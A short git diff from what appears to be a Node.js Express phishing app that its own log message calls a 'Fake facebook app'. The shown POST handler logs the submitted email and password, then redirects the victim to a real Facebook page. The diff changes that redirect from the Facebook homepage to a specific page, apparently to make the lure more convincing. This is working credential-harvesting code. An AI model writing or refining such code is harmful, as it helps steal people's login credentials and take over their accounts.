@@ -23,7 +23,7 @@ app.post('/', function (req, res) {
     console.log("password:",  password);
     logger.info("email:",  email);
     logger.info("password:",  password);
-    res.redirect("https://www.facebook.com/")
+    res.redirect("https://www.facebook.com/fitnessupsaojoao/")
   })
 
 app.listen(PORT, () => console.log(`Fake facebook app listening at http://localhost:${PORT}`))
